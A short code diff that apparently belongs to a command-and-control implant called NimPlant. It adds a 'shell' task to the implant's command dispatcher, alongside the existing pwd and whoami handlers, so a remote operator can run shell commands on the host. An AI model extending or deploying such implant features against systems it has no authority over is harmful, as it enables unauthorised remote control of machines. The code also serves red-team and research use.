@@ -422,6 +422,11 @@ bool ExecuteTaskForNimPlantClient(struct Relocatable* context, struct NimPlantCo
     bCompare = context->functions.strcmp(lpTask->command, PwdCommand);
     if (bCompare == 0) return CommandPwd(context, config, client, lpTask);
 
+    // shell
+    DEFINE_STRING(ShellCommand, "shell");
+    bCompare = context->functions.strcmp(lpTask->command, ShellCommand);
+    if (bCompare == 0) return CommandShell(context, config, client, lpTask);
+
     // whoami
     DEFINE_STRING(WhoamiCommand, "whoami");
     bCompare = context->functions.strcmp(lpTask->command, WhoamiCommand);
